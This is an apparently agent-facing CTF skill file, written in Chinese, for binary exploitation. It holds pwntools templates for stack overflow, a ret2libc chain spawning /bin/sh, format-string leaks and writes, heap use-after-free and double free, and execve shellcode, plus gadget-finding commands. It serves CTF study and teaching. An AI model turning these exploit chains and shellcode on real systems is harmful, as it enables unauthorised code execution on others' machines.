# ctf-pwn — CTF Pwn二进制漏洞利用

**路径**: `skills 目录/ctf-pwn/SKILL.md`

## 保护机制检查

```bash
checksec pwn
rabin2 -I pwn
```

| 保护 | 说明 | 绕过思路 |
|------|------|---------|
| NX | 栈不可执行 | ROP / ret2libc |
| PIE | 地址随机化 | 泄露 libc 地址 |
| RELRO | GOT 表只读 | 部分 RELRO 可改 |
| Canary | 栈金丝雀 | 泄露 / 劫持 __stack_chk_fail |

## 栈溢出

```python
from pwn import *

p = process('./pwn')

# 找偏移
payload = cyclic(200)
p.sendline(payload)
# gdb attach 后找 crash 地址
offset = cyclic_find(0x6161616c)  # 或手动 gdb 确定

# 基本 ROP
payload = flat([
    b'A' * offset,
    p64(0xdeadbeef)   # 覆盖返回地址
])
p.sendline(payload)
p.interactive()
```

## ROP — ret2libc

```python
from pwn import *

elf = ELF('./pwn')
libc = ELF('./libc.so.6')

p = process('./pwn')

# Step 1: 泄露 libc 地址
payload = flat([
    b'A' * offset,
    p64(elf.plt['puts']),
    p64(elf.symbols['main']),
    p64(elf.got['puts'])      # puts 参数
])
p.sendline(payload)
p.recvline()
libc.address = u64(p.recv(6).ljust(8, b'\x00')) - libc.sym['puts']

# Step 2: system("/bin/sh")
payload = flat([
    b'A' * offset,
    p64(ret_addr),             # 栈对齐
    p64(libc.sym['system']),
    p64(0),
    p64(next(libc.search(b'/bin/sh')))
])
p.sendline(payload)
p.interactive()
```

## 格式化字符串

```python
# 泄露
payload = b'%x.' * 10
payload = b'%7$x'             # 泄露第7个参数

# 写入
# %n：将已打印字符数写入地址
payload = b'A' * 0x20 + b'%n' + p64(0x404100)
```

## 堆漏洞

```python
# UAF（Use-After-Free）
p.sendline(b'2')   # delete chunk
p.sendline(b'3')   # show（chunk已释放）

# Double Free
p.sendline(b'2')   # delete A
p.sendline(b'2')   # 再次 delete

# House of Spirit / Force / Lore / Einherjar
# 见 SKILL.md 详细代码
```

## Shellcode

```python
from pwn import *

# pwntools 自动生成
shellcode = asm(shellcraft.amd64.linux.sh())

# 或手动
context.arch = 'amd64'
shellcode = asm("""
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x68732f6e69622f
    push rax
    mov rdi, rsp
    mov rax, 59
    syscall
""")
```

## 常用工具

```bash
# ROPgadget
ROPgadget --binary ./pwn --only "pop|ret" --no-jmp
ROPgadget --binary ./pwn --string "/bin/sh"

# one_gadget（找 execve("/bin/sh",0,0) gadget）
one_gadget libc.so.6

# gdb + pwndbg
gdb ./pwn
pwndbg ./pwn
```

## 快速模板

```python
from pwn import *
context.arch = 'amd64'
context.log_level = 'debug'

p = process('./pwn')
# p = remote('host', port)

offset = 72  # 已知偏移

payload = flat([
    b'A' * offset,
    p64(gadget),
    ...
])
p.sendline(payload)
p.interactive()
```

## 触发词
CTF Pwn、栈溢出、ROP、格式化字符串、堆漏洞、Shellcode、ret2libc、checksec、one_gadget
